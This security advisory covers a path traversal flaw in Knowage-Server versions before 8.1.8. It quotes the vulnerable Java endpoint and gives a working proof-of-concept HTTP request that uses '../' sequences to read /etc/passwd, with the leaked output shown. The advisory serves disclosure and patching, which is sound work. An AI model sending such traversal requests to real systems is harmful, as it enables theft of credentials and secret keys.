# Path traversal in download functionalities

Moderate

Jul 3, 2023

## Package

KnowageLabs / Knowage-Server
(Knowage)

## Affected versions

6.x.x, 7.x.x, 8.0.x, < 8.1.8

## Patched versions

8.1.8

## Description

The */knowage/restful-services/dossier/importTemplateFile* endpoint allows authenticated users to download templates hosted on the server.

```
// knowage-core/src/main/java/it/eng/spagobi/api/DossierActivityResource.java
@Path("/resourcePath")
public Response getresourcePath(@QueryParam("templateName") String fileName) throws JSONException {
    // [...]
    String outPath = SpagoBIUtilities.getResourcePath() + separator + "dossier" + separator + fileName;
    // [...]
    File file = new File(outPath);
    // [...]
    try {
        bytes = Files.readAllBytes(file.toPath());
        responseBuilder = Response.ok(bytes);
```

However, the application does not sanitize the *templateName* parameter allowing an attacker to use "*../*" in it, and escaping the directory the templates are normally placed and download any file from the system.

In the following example Synacktiv experts were able to retrieve the */etc/passwd* file from the server hosting the application.

```
GET /knowage/restful-services/dossier/resourcePath?templateName=../../../../../../etc/passwd HTTP/1.1
Host: knowage.local:8088
Cookie: JSESSIONID=8C072A9A51CBFBA80049298EC4757C6D

HTTP/1.1 200
Date: Mon, 27 Jun 2022 17:34:21 GMT
[...]

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
[...]

```

It’s important to note that this is not the only place a path traversal attack could be performed, however other vulnerable endpoints either require more privileges, or append other strings to the controlled path provided by the attacker, making the exploitation harder.

For example the following methods are also affected by this kind of vulnerability:

* knowage-core/src/main/java/it/eng/spagobi/api/DataSetResource.java@cloneFile
* knowage-core/src/main/java/it/eng/spagobi/engines/chart/service/GetPngAction.java

### Impact

This vulnerability allows a low privilege attacker to exfiltrate sensitive configuration files such as:

* Database credentials
* HMAC key in order to craft JWT token
* Tomcat credentials if the manager interface is enabled

### Patches

You need to upgrade to Knowage 8.1.8 or a later version.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
